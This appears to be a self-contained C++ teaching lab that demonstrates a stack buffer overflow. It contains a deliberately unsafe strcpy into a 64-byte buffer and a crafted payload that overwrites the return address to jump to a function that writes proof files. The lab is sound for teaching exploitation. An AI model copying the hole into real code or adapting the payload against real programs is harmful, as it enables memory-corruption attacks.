#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <iostream>
#include <string>
#ifdef _WIN32
    #include <io.h>
    #include <process.h>  // for _exit()
    #define STDOUT_FILENO 1
#else
    #include <unistd.h>
#endif

int main(int argc, char** argv);

[[noreturn]] void secret() {
    // Use direct file operations instead of system() calls
    FILE* file1 = fopen("./exploit_success.txt", "w");
    if (file1) {
        fprintf(file1, "Exploit executed successfully!\n");
        fclose(file1);
    }
    
    FILE* file2 = fopen("./exploit_proof.txt", "w");
    if (file2) {
        fprintf(file2, "Buffer overflow exploit executed at %p\n", (void*)&secret);
        fprintf(file2, "This proves the return address was successfully overwritten!\n");
        fclose(file2);
    }
    
    // Use write() for output to avoid potential stack issues with printf
    const char msg1[] = "*** Files created: exploit_success.txt and exploit_proof.txt ***\n";
    const char msg2[] = "*** Exploit successful! ***\n";
    write(STDOUT_FILENO, msg1, sizeof(msg1)-1);
    write(STDOUT_FILENO, msg2, sizeof(msg2)-1);
    
    _exit(42);  // Exit immediately
}

void safe_function() {
    printf("Normal function executed.\n");
}

void vulnerable_function(const char* input) {
    char buffer[64];
    printf("Copying input (%zu bytes) into buffer[64]...\n", strlen(input));
    strcpy(buffer, input); // overflow occurs here
    printf("Done copying. Buffer content: %s\n", buffer);
}

void print_addresses() {
    printf("Function addresses:\n");
    printf("  main               : %p\n", (void*)&main);
    printf("  safe_function      : %p\n", (void*)&safe_function);
    printf("  secret             : %p\n", (void*)&secret);
    printf("  vulnerable_function: %p\n", (void*)&vulnerable_function);
    printf("\n");
}

void menu() {
    printf("Stack Exploitation Lab\n");
    printf("======================\n");
    printf("Choose scenario:\n");
    printf("1. Safe function\n");
    printf("2. Vulnerable function (input from stdin)\n");
    printf("3. Vulnerable function (crafted payload)\n");
    printf("\nSelect mode: ");
}

int main(int argc, char** argv) {
    print_addresses();

    menu();
    int choice;
    if (scanf("%d", &choice) != 1) {
        printf("Invalid input.\n");
        return 1;
    }
    getchar();

    if (choice == 1) {
        safe_function();
    }
    else if (choice == 2) {
        char input[256];
        printf("Enter your input: ");
        fgets(input, sizeof(input), stdin);
        size_t len = strlen(input);
        if (len > 0 && input[len - 1] == '\n') {
            input[len - 1] = '\0';
        }
        vulnerable_function(input);
    }
    else if (choice == 3) {
        std::string payload;

        // Padding for buffer (64 bytes)
        payload.append(64, 'A');

        // Padding for saved RBP (8 bytes on x86_64)
        payload.append(8, 'B');

        // Overwrite return address with address of secret(), in little-endian
        uintptr_t addr = reinterpret_cast<uintptr_t>(&secret);
        for (size_t i = 0; i < sizeof(addr); ++i) {
            payload.push_back(static_cast<char>((addr >> (8 * i)) & 0xFF));
        }

        printf("Using crafted payload (%zu bytes)...\n", payload.size());
        vulnerable_function(payload.c_str());
    }
    else {
        printf("Unknown mode.\n");
    }

    printf("Program completed.\n");
    return 0;
}
